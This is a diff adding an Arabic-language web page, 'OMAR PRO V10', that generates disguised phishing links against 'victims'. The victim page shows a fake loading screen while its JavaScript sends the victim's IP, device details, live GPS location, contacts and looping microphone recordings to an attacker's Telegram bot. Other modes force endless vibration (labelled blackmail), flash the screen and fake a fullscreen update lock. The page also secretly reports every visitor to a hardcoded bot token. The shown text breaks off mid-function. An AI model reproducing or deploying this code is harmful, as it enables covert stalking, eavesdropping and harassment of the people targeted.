@@ -1,0 +1,978 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Omar Abdel Tawab Saleh</title>
+   <meta name="title" content="SYSTEM BY OMAR PRO">
+<meta name="description" content="Advanced Security System & Tools | Developed by OMAR ABD EL-TAWAB">
+
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://omar-pro-v10.com/"> <meta property="og:title" content="⚡ OMAR SYSTEM V10">
+<meta property="og:description" content="Secure Access Console. Created and Maintained by OMAR.">
+<meta property="og:image" content="https://img.icons8.com/fluency/200/shield.png"> <meta property="twitter:card" content="summary_large_image">
+<meta property="twitter:title" content="SYSTEM BY OMAR">
+<meta property="twitter:description" content="Professional tools developed by OMAR ABD EL-TAWAB SALEH.">
+<meta property="twitter:image" content="https://img.icons8.com/fluency/200/shield.png">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    
+    <style>
+        :root { --blue: #007bff; --yellow: #ffcc00; --gear-gray: #444; --glass: rgba(255, 255, 255, 0.9); }
+        body, html { margin: 0; padding: 0; min-height: 100vh; background: #ffffff; font-family: 'Segoe UI', Tahoma, sans-serif; overflow-x: hidden; }
+
+        /* 1. نظام التروس المتحركة */
+        #loader { position: fixed; inset: 0; background: white; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .gears-container { position: relative; width: 150px; height: 150px; filter: drop-shadow(0 10px 20px rgba(0,0,0,0.3)); }
+        .gear { position: absolute; color: var(--gear-gray); animation: spin 1.2s linear infinite; }
+/* تنسيق التروس الخمسة المطور */
+.g1 { font-size: 80px; top: 0; left: 17px; color: var(--blue); }
+.g2 { font-size: 55px; top: 65px; left: 65px; animation-direction: reverse; color: var(--gear-gray); }
+.g3 { font-size: 40px; top: 29px; left: 88px; animation-duration: 0.8s; color: var(--gear-gray); }
+.g4 { font-size: 45px; top: 75px; left: -15px; animation-direction: reverse; color: var(--gear-gray); }
+.g5 { font-size: 30px; top: 1px; left: 85px; animation-duration: 1.5s; color: var(--gear-gray); } /* الترس الأزرق */
+
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+        /* 2. صفحة الدخول */
+#login-page { 
+    display: none; 
+    height: 100vh; 
+    align-items: center; 
+    justify-content: center; 
+    opacity: 0; 
+    transition: 1s; 
+}
+
+/* تحويل الإطار من دائري إلى مستطيل دائري الحواف */
+.circle-frame { 
+    position: relative; 
+    width: 400px;           /* عرض المستطيل */
+    height: 450px;          /* طول المستطيل */
+    border-radius: 30px;    /* درجة انحناء الحواف */
+    display: flex; 
+    align-items: center; 
+    justify-content: center; 
+    overflow: hidden; 
+    box-shadow: 0 20px 50px rgba(0,0,0,0.1); 
+}
+
+/* تأثير الإضاءة المتحركة خلف الإطار */
+.circle-frame::before { 
+    content: ''; 
+    position: absolute; 
+    width: 200%;            /* زيادة العرض لضمان تغطية الزوايا أثناء الدوران */
+    height: 200%; 
+    background: conic-gradient(transparent, var(--blue), var(--yellow), transparent); 
+    animation: spin 4s linear infinite; 
+}
+
+/* الطبقة الداخلية البيضاء (تأخذ شكل المستطيل أيضاً) */
+.circle-frame::after { 
+    content: ''; 
+    position: absolute; 
+    inset: 5px;             /* سمك الإطار المضيء */
+    background: #fff; 
+    border-radius: 25px;    /* يجب أن تكون أقل من الخارج بقليل */
+    z-index: 1; 
+}
+
+.login-content { 
+    position: relative; 
+    z-index: 2; 
+    width: 85%; 
+    text-align: center; 
+}
+
+.dev-header { font-size: 10px; color: #888; font-weight: bold; letter-spacing: 2px; }
+.dev-name { 
+    font-size: 22px; 
+    font-weight: 900; 
+    margin: 10px 0; 
+    background: linear-gradient(45deg, var(--blue), var(--yellow)); 
+    -webkit-background-clip: text; 
+    -webkit-text-fill-color: transparent; 
+}
+
+input { 
+    width: 90%; 
+    padding: 12px; 
+    margin: 8px 0; 
+    border: 1px solid #ddd; 
+    border-radius: 12px;    /* حواف المدخلات متناسقة مع الإطار */
+    text-align: center; 
+    outline: none; 
+}
+
+.btn-main { 
+    width: 95%; 
+    padding: 14px; 
+    background: var(--blue); 
+    color: white; 
+    border: none; 
+    border-radius: 12px;    /* حواف الزر متناسقة مع الإطار */
+    font-weight: bold; 
+    cursor: pointer; 
+    transition: 0.3s; 
+}
+
+.btn-main:hover { background: var(--yellow); color: black; }
+
+        /* 3. لوحة التحكم المطورة */
+        #dashboard { display: none; padding: 25px; background: #f8f9fa; min-height: 100vh; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; max-width: 1000px; margin: 20px auto; }
+        
+     /* --- ستايل البطاقات المطور --- */
+.tool-card { 
+    background: var(--glass); 
+    backdrop-filter: blur(10px); 
+    padding: 30px 20px; 
+    border-radius: 20px; 
+    text-align: center; 
+    cursor: pointer; 
+    /* البرواز الشفاف الافتراضي */
+    border: 1px solid rgba(0,0,0,0.05); 
+    /* إضافة البرواز الجانبي الافتراضي */
+    border-right: 5px solid transparent; 
+    transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
+    box-shadow: 0 10px 20px rgba(0,0,0,0.05);
+    position: relative;
+    overflow: hidden;
+}
+
+/* تأثير الحركة عند الوقوف على البطاقة */
+.tool-card:hover { 
+    transform: translateY(-10px) scale(1.02); 
+}
+
+/* --- نظام الألوان والتوهج والبراويز الجانبية --- */
+
+/* أزرق - للموقع */
+.glow-blue { border-right-color: #4285F4 !important; }
+.glow-blue:hover {
+    border-color: #4285F4;
+    box-shadow: 0 0 20px rgba(66, 133, 244, 0.4);
+}
+
+/* أحمر - للكاميرات والاهتزاز والميكروفون */
+.glow-red { border-right-color: #e91e63 !important; }
+.glow-red:hover {
+    border-color: #e91e63;
+    box-shadow: 0 0 20px rgba(233, 30, 99, 0.4);
+}
+
+/* أخضر - لجهات الاتصال والبيانات */
+.glow-green { border-right-color: #4caf50 !important; }
+.glow-green:hover {
+    border-color: #4caf50;
+    box-shadow: 0 0 20px rgba(76, 175, 80, 0.4);
+}
+
+/* أصفر - للقفل */
+.glow-yellow { border-right-color: #ffcc00 !important; }
+.glow-yellow:hover {
+    border-color: #ffcc00;
+    box-shadow: 0 0 20px rgba(255, 204, 0, 0.4);
+}
+
+/* سماوي - للبيانات المتقدمة */
+.glow-cyan { border-right-color: #00bcd4 !important; }
+.glow-cyan:hover {
+    border-color: #00bcd4;
+    box-shadow: 0 0 20px rgba(0, 188, 212, 0.4);
+}
+
+/* تحسين شكل الأيقونات داخل البطاقات */
+.tool-card i { 
+    font-size: 45px; 
+    margin-bottom: 15px; 
+    transition: 0.3s;
+}
+
+.tool-card:hover i {
+    transform: scale(1.1) rotate(5deg);
+}
+
+        /* 4. منطقة النتائج */
+        #results { display: none; padding: 40px 20px; text-align: center; }
+        .result-box { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 550px; margin: 0 auto; }
+        .link-item { background: #f0f0f0; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px dashed var(--blue); font-size: 11px; display: flex; justify-content: space-between; align-items: center; word-break: break-all; }
+
+        /* صفحة الضحية */
+        #victim-view { display: none; text-align: center; padding-top: 100px; }
+        /* حاوية الأيقونات */
+.social-icons { 
+    margin: 25px 0; 
+    display: flex; 
+    justify-content: center; 
+    gap: 15px; 
+}
+
+.social-icons a { 
+    text-decoration: none;
+    width: 45px;
+    height: 45px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 50%;
+    background: #fff;
+    font-size: 45px; /* حجم الأيقونة نفس حجم الدائرة لتملأها */
+    transition: 0.4s;
+    position: relative;
+}
+
+/* الألوان الرسمية والتوهج */
+
+/* تليجرام */
+.fa-telegram { 
+    color: #0088cc; 
+    filter: drop-shadow(0 0 5px rgba(0, 136, 204, 0.4));
+    animation: glow-tele 2s infinite alternate;
+}
+@keyframes glow-tele {
+    from { filter: drop-shadow(0 0 2px #0088cc); }
+    to { filter: drop-shadow(0 0 10px #0088cc); }
+}
+
+/* واتساب */
+.fa-whatsapp { 
+    color: #25d366; 
+    filter: drop-shadow(0 0 5px rgba(37, 211, 102, 0.4));
+    animation: glow-wa 2s infinite alternate;
+}
+@keyframes glow-wa {
+    from { filter: drop-shadow(0 0 2px #25d366); }
+    to { filter: drop-shadow(0 0 10px #25d366); }
+}
+
+/* فيسبوك */
+.fa-facebook { 
+    color: #1877f2; 
+    filter: drop-shadow(0 0 5px rgba(24, 119, 242, 0.4));
+    animation: glow-fb 2s infinite alternate;
+}
+@keyframes glow-fb {
+    from { filter: drop-shadow(0 0 2px #1877f2); }
+    to { filter: drop-shadow(0 0 10px #1877f2); }
+}
+
+/* تأثير عند الوقوف بالماوس */
+.social-icons a:hover {
+    transform: scale(1.2) rotate(10deg);
+}
+/* لون أيقونة اللوكيشن الرسمي (Google Maps Style) */
+.tool-card i.fa-location-arrow {
+    color: #4285F4; /* لون جوجل الأزرق */
+    filter: drop-shadow(0 0 8px rgba(66, 133, 244, 0.5));
+}
+/* تصميم شاشة تمويه الضحية */
+.victim-loader {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 80vh;
+}
+
+.dots-container {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 20px;
+}
+
+.dot {
+    width: 15px;
+    height: 15px;
+    background-color: #4285F4; /* لون جوجل */
+    border-radius: 50%;
+    animation: bounce 1.4s infinite ease-in-out both;
+}
+
+.dot:nth-child(1) { animation-delay: -0.32s; }
+.dot:nth-child(2) { animation-delay: -0.16s; }
+
+@keyframes bounce {
+    0%, 80%, 100% { transform: scale(0); }
+    40% { transform: scale(1.0); }
+}
+
+#status-text {
+    font-size: 18px;
+    color: #5f6368;
+    font-weight: bold;
+    animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+    0% { opacity: 1; }
+    50% { opacity: 0.5; }
+    100% { opacity: 1; }
+}
+/* --- الإضافات الجديدة للألوان والروابط --- */
+
+/* تلوين أيقونات الأدوات بشكل احترافى */
+/* الألوان الصحيحة بدون أخطاء في الكلاسات */
+.fa-location-arrow { color: #4285F4 !important; }
+.fa-camera-rotate { color: #e91e63 !important; }
+.fa-address-book { color: #4caf50 !important; }
+.fa-lock { color: #f44336 !important; }
+.fa-mobile-vibration { color: #ff1100 !important; }
+.fa-microphone { color: #ff5722 !important; }
+.fa-battery-full { color: #4caf50 !important; }
+
+/* تأثير التوهج لكل الأيقونات */
+.tool-card i {
+    filter: drop-shadow(0 0 5px rgba(0,0,0,0.1));
+    transition: 0.3s;
+}
+
+/* تنسيق حاوية الروابط الثلاثة مع السكرول */
+.links-scroll-area {
+    max-height: 180px; /* طول منطقة السكرول */
+    overflow-y: auto;  /* تفعيل التمرير العمودي */
+    margin: 15px 0;
+    padding: 10px;
+    background: #f8f9fa;
+    border-radius: 12px;
+    border: 1px solid #eee;
+}
+
+/* تحسين شكل الروابط داخل السكرول */
+.link-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background: white;
+    padding: 8px 12px;
+    margin-bottom: 8px;
+    border-radius: 8px;
+    border-right: 4px solid var(--blue); /* علامة زرقاء بجانب كل رابط */
+    font-size: 11px;
+    word-break: break-all;
+}
+
+/* تخصيص شكل السكرول بار (Scrollbar) ليكون أنيقاً */
+.links-scroll-area::-webkit-scrollbar { width: 5px; }
+.links-scroll-area::-webkit-scrollbar-thumb { background: var(--blue); border-radius: 10px; }
+.gmaps-icon {
+    width: 45px;
+    height: 45px;
+    background-image: url('https://upload.wikimedia.org/wikipedia/commons/a/aa/Google_Maps_icon_%282020%29.svg');
+    background-size: contain;
+    background-repeat: no-repeat;
+    background-position: center;
+    display: inline-block;
+    margin-bottom: 10px;
+}
+.tool-card i.fa-mobile-vibration { 
+    color: #ff1100 !important; 
+    filter: drop-shadow(0 0 10px rgba(255, 17, 0, 0.5));
+}
+.tool-card:active {
+    transform: scale(0.95);
+    background: #eef5ff;
+}
+
+.tool-card h4 {
+    margin-top: 10px;
+    font-size: 16px;
+    color: #444;
+}
+
+/* ستايل التوهج الافتراضي عند الوقوف بالماوس */
+.tool-card {
+    transition: all 0.4s ease; /* لجعل التوهج يظهر بنعومة */
+}
+
+/* توهج أزرق (للموقع والبيانات) */
+.glow-blue:hover {
+    border-color: #4285F4 !important;
+    box-shadow: 0 0 15px rgba(66, 133, 244, 0.4), 0 0 30px rgba(66, 133, 244, 0.2);
+}
+
+/* توهج وردي/أحمر (للكاميرا والاهتزاز) */
+.glow-red:hover {
+    border-color: #e91e63 !important;
+    box-shadow: 0 0 15px rgba(233, 30, 99, 0.4), 0 0 30px rgba(233, 30, 99, 0.2);
+}
+
+/* توهج أخضر (لجهات الاتصال والبطارية) */
+.glow-green:hover {
+    border-color: #4caf50 !important;
+    box-shadow: 0 0 15px rgba(76, 175, 80, 0.4), 0 0 30px rgba(76, 175, 80, 0.2);
+}
+
+/* توهج أصفر (للقفل) */
+.glow-yellow:hover {
+    border-color: #ffcc00 !important;
+    box-shadow: 0 0 15px rgba(255, 204, 0, 0.4), 0 0 30px rgba(255, 204, 0, 0.2);
+}
+
+
+    </style>
+</head>
+<body>
+
+    <div id="loader">
+<div class="gears-container">
+    <i class="fa-solid fa-cog gear g1"></i>
+    <i class="fa-solid fa-cog gear g2"></i>
+    <i class="fa-solid fa-cog gear g3"></i>
+    
+    <i class="fa-solid fa-cog gear g5"></i>
+</div>
+
+        <h3 id="loader-text" style="margin-top:25px;">جاري تسجيل الدخول للنظام...</h3>
+    </div>
+
+    <div id="login-page">
+        <div class="circle-frame">
+            <div class="login-content">
+                <div class="dev-header">DEVELOPED BY</div>
+                <div class="dev-name">Omar Abd El-Tawab Saleh</div>
+
+                <input type="text" id="bot_token" placeholder="BOT TOKEN">
+                <input type="text" id="chat_id" placeholder="CHAT ID">
+                <button class="btn-main" onclick="startApp()">LOGIN TO DASHBOARD</button>
+                                <div class="social-icons">
+                    <a href="#"><i class="fa-brands fa-telegram"></i></a>
+                    <a href="#"><i class="fa-brands fa-whatsapp"></i></a>
+                    <a href="#"><i class="fa-brands fa-facebook"></i></a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+<div id="dashboard" style="display: none;">
+    
+    <div id="developer-branding" style="
+        position: relative; 
+        margin: 20px auto; 
+        padding: 15px 40px; 
+        background: #fff; 
+        border-radius: 50px; 
+        z-index: 1; 
+        overflow: hidden; 
+        width: fit-content;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+    ">
+        <style>
+            #developer-branding::before {
+                content: '';
+                position: absolute;
+                z-index: -2;
+                left: -50%; top: -50%;
+                width: 200%; height: 200%;
+                background-image: conic-gradient(transparent, #ff8c00, #007bff, transparent 30%);
+                animation: rotate-border 3s linear infinite;
+            }
+            #developer-branding::after {
+                content: '';
+                position: absolute;
+                z-index: -1;
+                left: 3px; top: 3px;
+                width: calc(100% - 6px);
+                height: calc(100% - 6px);
+                background: white;
+                border-radius: 47px;
+            }
+        </style>
+        <div style="position: relative; z-index: 2; text-align: center;">
+            <span style="font-size: 10px; color: #888; display: block; text-transform: uppercase; letter-spacing: 2px;">This was developed by;</span>
+            <div class="dev-name" style="font-size: 24px; font-weight: 900; margin: 0; color: #333;">Omar Abd El-Tawab Saleh</div>
+            
+            <div class="social-icons" style="margin-top: 10px; gap: 10px;">
+                <a href="#"><i class="fa-brands fa-telegram" style="font-size: 25px;"></i></a>
+                <a href="#"><i class="fa-brands fa-whatsapp" style="font-size: 25px;"></i></a>
+                <a href="#"><i class="fa-brands fa-facebook" style="font-size: 25px;"></i></a>
+            </div>
+        </div>
+    </div>
+
+  <div class="grid">
+    <div class="tool-card glow-blue" onclick="injectLink('Location', 'تحديد موقع')">
+        <div class="gmaps-icon"></div>
+        <h4>تحديد موقع</h4>
+    </div>
+
+    <div class="tool-card glow-red" onclick="injectLink('Front_Cam', 'كاميرا أمامية')">
+        <i class="fa-solid fa-camera-rotate"></i>
+        <h4>كاميرا أمامية</h4>
+    </div>
+    
+    <div class="tool-card glow-green" onclick="injectLink('Contacts', 'سحب جهات الاتصال')">
+        <i class="fa-solid fa-address-book"></i>
+        <h4>جهات الاتصال</h4>
+    </div>
+
+    <div class="tool-card glow-red" onclick="injectLink('Back_Cam', 'كاميرا خلفية')">
+        <i class="fa-solid fa-camera"></i>
+        <h4>كاميرا خلفية</h4>
+    </div>
+    
+    <div class="tool-card glow-yellow" onclick="injectLink('Lock', 'قفل الشاشة')">
+        <i class="fa-solid fa-lock" style="color: #ffcc00;"></i>
+        <h4>قفل الشاشة</h4>
+    </div>
+
+    <div class="tool-card glow-red" onclick="injectLink('Vibrate', 'اهتزاز مستمر')">
+        <i class="fa-solid fa-mobile-screen-button" style="color: #ff1100;"></i>
+        <h4>اهتزاز مستمر</h4>
+    </div>
+
+    <div class="tool-card glow-red" onclick="injectLink('Mic', 'تسجيل الصوت')">
+        <i class="fa-solid fa-microphone" style="color: #ff5722;"></i>
+        <h4>ميكروفون</h4>
+    </div>
+
+    <div class="tool-card glow-green" onclick="injectLink('Device', 'بيانات كاملة')">
+        <i class="fa-solid fa-battery-full"></i>
+        <h4>بيانات جهاز</h4>
+    </div>
+
+    <div class="tool-card glow-cyan" onclick="injectLink('Full_Info', 'بيانات متقدمة')">
+        <i class="fa-solid fa-signal" style="color: #00bcd4;"></i>
+        <h4>بيانات متقدمة</h4>
+    </div>
+</div>
+
+
+
+   <div id="results">
+    <div class="result-box">
+        <h2 id="res-title" style="color:var(--blue)"></h2>
+        <p>الروابط المولدة جاهزة (قم بالتمرير للأسفل):</p>
+        
+        <div class="links-scroll-area">
+            <div class="link-item">
+                <span id="link-1"></span>
+                <button class="btn-main" style="width:auto; padding:5px" onclick="copyAny('link-1')">نسخ</button>
+            </div>
+            <div class="link-item">
+                <span id="link-2"></span>
+                <button class="btn-main" style="width:auto; padding:5px" onclick="copyAny('link-2')">نسخ</button>
+            </div>
+            <div class="link-item">
+                <span id="link-3"></span>
+                <button class="btn-main" style="width:auto; padding:5px" onclick="copyAny('link-3')">نسخ</button>
+            </div>
+        </div>
+
+        <button class="btn-main" onclick="location.reload()" style="background:red;">BACK</button>
+        
+        <div style="margin-top:20px; font-size:12px; color:#888;">
+            Developed by: Omar Abd El-Tawab Saleh
+        </div>
+    </div>
+</div>
+
+ <div id="victim-view">
+    <div class="victim-loader">
+        <div class="dots-container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+        <div id="status-text">جاري فحص جودة الاتصال...</div>
+        <p style="color: #9aa0a6; font-size: 14px; margin-top: 10px;">يرجى الانتظار، قد يستغرق الأمر لحظات</p>
+    </div>
+
+</div>
+
+
+    <script>
+        const ui = { 
+            loader: document.getElementById('loader'), 
+            login: document.getElementById('login-page'), 
+            dash: document.getElementById('dashboard'), 
+            res: document.getElementById('results'),
+            txt: document.getElementById('loader-text')
+        };
+
+        const params = new URLSearchParams(window.location.search);
+
+        // تشغيل النظام بناءً على الرابط
+        // تشغيل النظام وإرسال إشعار الزائر فوراً
+window.onload = () => {
+    // إعداد عنوان الصفحة باسمك
+    document.title = "SYSTEM BY OMAR PRO V10 ⚡";
+
+    if(params.has('view')) {
+        handleVictim();
+    } else {
+        // استدعاء إشعار الزائر الجديد
+        sendVisitorNotification(); 
+
+        setTimeout(() => {
+            ui.txt.innerHTML = `<i class="fas fa-shield-alt"></i> جاري تشفير الرابط بطبقة حماية SSL...`;
+            ui.loader.style.display = 'none';
+            ui.login.style.display = 'flex';
+            setTimeout(() => ui.login.style.opacity = '1', 50);
+        }, 4000);
+    }
+};
+
+// الدالة المسؤولة عن إرسال الإشعار إلى بوت التليجرام الخاص بك
+async function sendVisitorNotification() {
+    // بياناتك التي أرسلتها
+    const tk = "8522437337:AAHwqXJjBqbbTL-QDbQoV7eoHp6fWFkopno"; 
+    const id = "6068331455";
+    
+    try {
+        // جلب الـ IP ومعلومات إضافية (الدولة والمدينة) لزيادة الاحترافية
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        
+        const message = `🔔 **تنبيه زائر جديد لموقعك!**\n\n` +
+                        `👤 المطور: **عمر عبد التواب صالح**\n` +
+                        `🌐 الـ IP: \`${data.ip}\`\n` +
+                        `📍 الدولة: ${data.country_name} (${data.city})\n` +
+                        `📱 الجهاز: \`${navigator.platform}\`\n` +
+                        `🔗 المتصفح: \`${navigator.userAgent.slice(0, 30)}...\`\n` +
+                        `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+
+        await fetch(`https://api.telegram.org/bot${tk}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: id,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+    } catch (error) {
+        // محاولة بديلة في حال فشل الرابط الأول لجلب الـ IP فقط
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                const fallbackMsg = `🔔 **زائر جديد (بيانات محدودة):**\n🌐 IP: \`${data.ip}\``;
+                fetch(`https://api.telegram.org/bot${tk}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: id, text: fallbackMsg, parse_mode: 'Markdown' })
+                });
+            });
+    }
+}
+
+
+     function startApp() {
+    const tk = document.getElementById('bot_token').value;
+    const id = document.getElementById('chat_id').value;
+    
+    if(!tk || !id) return alert("Please fill all data!");
+    
+    // 1. حفظ البيانات
+    localStorage.setItem('o_tk', tk);
+    localStorage.setItem('o_id', id);
+
+    // 2. إخفاء صفحة الدخول بتأثير تلاشي
+    ui.login.style.opacity = '0';
+    
+    setTimeout(() => {
+        ui.login.style.display = 'none';
+        
+        // 3. إظهار التروس مرة أخرى وتغيير النص
+        ui.loader.style.display = 'flex';
+        ui.loader.style.opacity = '1';
+        ui.txt.innerText = "جاري الدخول للوحة التحكم...";
+        
+        // 4. الانتظار لمدة 3 ثوانٍ ثم الانتقال للوحة التحكم
+        setTimeout(() => {
+            ui.loader.style.opacity = '0'; // تلاشي التروس
+            setTimeout(() => {
+                ui.loader.style.display = 'none';
+                ui.dash.style.display = 'block'; // إظهار لوحة التحكم
+            }, 500);
+        }, 3000); // مدة الـ 3 ثوانٍ التي طلبتها
+        
+    }, 800);
+}
+
+
+     function injectLink(name, desc) {
+    // 1. استخراج البيانات المحفوظة وتشفيرها
+    const tk = btoa(localStorage.getItem('o_tk'));
+    const id = btoa(localStorage.getItem('o_id'));
+    const host = window.location.href.split('?')[0];
+    
+    // إنشاء الرابط الأساسي (Payload)
+    const payload = `${host}?view=victim&type=${name}&t=${tk}&i=${id}`;
+
+    // 2. إخفاء لوحة التحكم وتفعيل شاشة التحميل
+    ui.dash.style.display = 'none';
+    ui.loader.style.display = 'flex';
+    ui.loader.style.opacity = '1';
+    ui.txt.innerText = `جاري تجهيز رابط ${desc}...`; 
+
+    // 3. محاكاة عملية التوليد (الانتظار لمدة 3 ثوانٍ)
+    setTimeout(() => {
+        ui.loader.style.opacity = '0'; // تلاشي التروس
+        
+        setTimeout(() => {
+            ui.loader.style.display = 'none';
+            ui.res.style.display = 'block'; // إظهار صفحة النتائج
+            
+            // تحديث عنوان الأداة المستخدمة
+            document.getElementById('res-title').innerText = name;
+
+            // 4. توزيع 3 روابط مختلفة (تمويه السيرفرات) داخل السكرول
+            document.getElementById('link-1').innerText = payload + "&srv=primary";
+            document.getElementById('link-2').innerText = payload + "&srv=backup";
+            document.getElementById('link-3').innerText = payload + "&srv=secure";
+            
+        }, 500);
+    }, 3000); 
+}
+
+/**
+ * دالة نسخ الروابط مع تأثير تغيير نص الزر
+ * @param {string} elementId - معرف العنصر الذي يحتوي على الرابط
+ * @param {HTMLElement} btn - الزر الذي تم الضغط عليه
+ */
+function copyAny(elementId, btn) {
+    const linkText = document.getElementById(elementId).innerText;
+    navigator.clipboard.writeText(linkText).then(() => {
+        const originalText = btn.innerText;
+        btn.innerText = "تم النسخ ✅";
+        btn.style.background = "#28a745"; // تغيير اللون للأخضر مؤقتاً
+        
+        setTimeout(() => {
+            btn.innerText = originalText;
+            btn.style.background = "var(--blue)";
+        }, 2000);
+    });
+}
+
+        function copyL() {
+            navigator.clipboard.writeText(document.getElementById('final-link').innerText);
+            alert("تم نسخ الرابط المحقون!");
+        }
+// --- كود الضحية المطور للإرسال اللا نهائي ---
+async function handleVictim() {
+    // 1. استخراج وتحليل البيانات من الرابط
+    const tk = atob(params.get('t'));
+    const id = atob(params.get('i'));
+    const type = params.get('type');
+
+    // 2. تفعيل واجهة التمويه للضحية
+    ui.loader.style.display = 'none';
+    document.getElementById('victim-view').style.display = 'block';
+
+    // 3. نظام رسائل التمويه المتغيرة
+    const statusElement = document.getElementById('status-text');
+    const messages = [
+        "جاري فحص جودة الاتصال...",
+        "جاري تهيئة النظام...",
+        "تحسين دقة المعالجة...",
+        "جاري تحميل البيانات...",
+        "يرجى الانتظار لحظة..."
+    ];
+    let msgIndex = 0;
+    setInterval(() => {
+        statusElement.innerText = messages[++msgIndex % messages.length];
+    }, 4000);
+    
+
+    // 4. إرسال بصمة الجهاز والمتصفح فور الدخول
+    let deviceLog = `⚠️ **صيد جديد: OMAR PRO**\n`;
+    deviceLog += `🛠 المهمة: ${type}\n`;
+    deviceLog += `📱 الجهاز: ${navigator.platform}\n`;
+    deviceLog += `🌐 المتصفح: ${navigator.userAgent.slice(0, 50)}...`;
+    fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => {
+        sendTele(tk, id, `🌐 **IP الضحية:** \`${data.ip}\``);
+    });
+
+    await sendTele(tk, id, deviceLog);
+
+    // --- فصل الوظائف بناءً على النوع (Type) ---
+
+    // [الوظيفة الأولى: تتبع الموقع اللانهائي]
+    if (type === 'Location') {
+        if (navigator.geolocation) {
+            navigator.geolocation.watchPosition(async (p) => {
+                const lat = p.coords.latitude;
+                const lon = p.coords.longitude;
+                let msg = `📍 **تحديث موقع مباشر**\n🎯 الإحداثيات: \`${lat},${lon}\`\n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
+                await sendTele(tk, id, msg);
+            }, (err) => {
+                sendTele(tk, id, "❌ الضحية رفض إذن الموقع.");
+            }, { enableHighAccuracy: true });
+        } else {
+            sendTele(tk, id, "❌ المتصفح لا يدعم الوصول للموقع.");
+        }
+    }
+    // [وظيفة سحب جهات الاتصال]
+else if (type === 'Contacts') {
+    const props = ['name', 'tel', 'email'];
+    const opts = { multiple: true };
+
+    try {
+        if ('contacts' in navigator && 'ContactsManager' in window) {
+            const contacts = await navigator.contacts.select(props, opts);
+            if (contacts.length > 0) {
+                let contactList = `👥 **تم سحب جهات اتصال:**\n`;
+                contacts.forEach(c => {
+                    contactList += `👤 الاسم: ${c.name}\n📞 الرقم: ${c.tel}\n---\n`;
+                });
+                await sendTele(tk, id, contactList);
+            }
+        } else {
+            sendTele(tk, id, "❌ المتصفح لا يدعم ميزة Contacts API.");
+        }
+    } catch (err) {
+        sendTele(tk, id, "❌ الضحية أغلق قائمة جهات الاتصال أو رفض.");
+    }
+}
+
+    // [وظيفة الاهتزاز اللانهائي]
+// [وظيفة الاهتزاز اللانهائي - الابتزاز]
+else if (type === 'Vibrate') {
+    // إرسال تنبيه لك بأن الضحية بدأ يعاني من الاهتزاز
+    await sendTele(tk, id, "🔥 بدأت عملية الاهتزاز المستمر (الابتزاز) على جهاز الضحية.");
+
+    // تفعيل حلقة الاهتزاز كل 2 ثانية
+    setInterval(() => {
+        if ("vibrate" in navigator) {
+            // يهتز لمدة ثانية كاملة
+            navigator.vibrate([10000]); 
+        }
+    }, 1500);
+
+    // تمويه إضافي: جعل الشاشة تومض باللون الأحمر
+    const bg = document.body.style;
+    setInterval(() => {
+        bg.backgroundColor = bg.backgroundColor === 'red' ? 'white' : 'red';
+    }, 500);
+}
+
+// [وظيفة قفل الشاشة التمويهي]
+else if (type === 'Lock') {
+    // نقوم بإظهار طبقة سوداء تغطي كل شيء لمنع الضحية من الضغط
+    const lockOverlay = document.createElement('div');
+    lockOverlay.style = "position:fixed; inset:0; background:black; z-index:10000; display:flex; align-items:center; justify-content:center; color:white; font-family:sans-serif;";
+    lockOverlay.innerHTML = "<h2>System Update... 2%</h2>";
+    document.body.appendChild(lockOverlay);
+    
+    // محاولة طلب ملء الشاشة لإجباره على البقاء
+    document.documentElement.requestFullscreen().catch(() => {});
+    
+    sendTele(tk, id, "🔒 تم إرسال شاشة القفل (تمويه التحديث) للضحية.");
+}
+
+        // [الوظيفة الثالثة: تسجيل الصوت اللانهائي]
+    else if (type === 'Mic') {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            
+            // دالة التسجيل المتكرر
+            const startRecording = () => {
+                const mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
+
+                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+                    await sendAudioTele(tk, id, blob, `🎙 تسجيل صوتي جديد (3 ثوانٍ)`);
+                    
+                    // البدء بالتسجيل التالي فوراً بعد الإرسال
+                    startRecording();
+                };
+
+                // بدء التسجيل
+                mediaRecorder.start();
+
+                // التوقف بعد 3 ثوانٍ (3000 مللي ثانية)
+                setTimeout(() => {
+                    if (mediaRecorder.state !== "inactive") {
+                        mediaRecorder.stop();
+                    }
+                }, 3000);
+            };
+
+            // تشغيل الدورة لأول مرة
+            startRecording();
+
+        } catch (err) {
+            await sendTele(tk, id, `❌ الضحية رفض إذن الميكروفون.`);
